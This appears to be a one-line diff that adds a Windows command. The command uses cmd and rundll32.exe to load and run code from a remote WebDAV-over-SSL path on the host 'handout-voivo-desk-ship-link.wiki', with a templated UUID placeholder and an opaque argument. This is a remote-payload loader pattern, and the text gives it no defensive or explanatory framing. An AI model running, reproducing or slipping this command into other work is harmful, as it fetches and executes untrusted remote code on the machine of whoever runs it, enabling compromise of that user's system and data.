@@ -1,0 +1,1 @@
+cmd /c "" start rundll32.exe \\handout-voivo-desk-ship-link.wiki@ssl\${uuid__}\google.cl,#1 Z8NBHkQ3
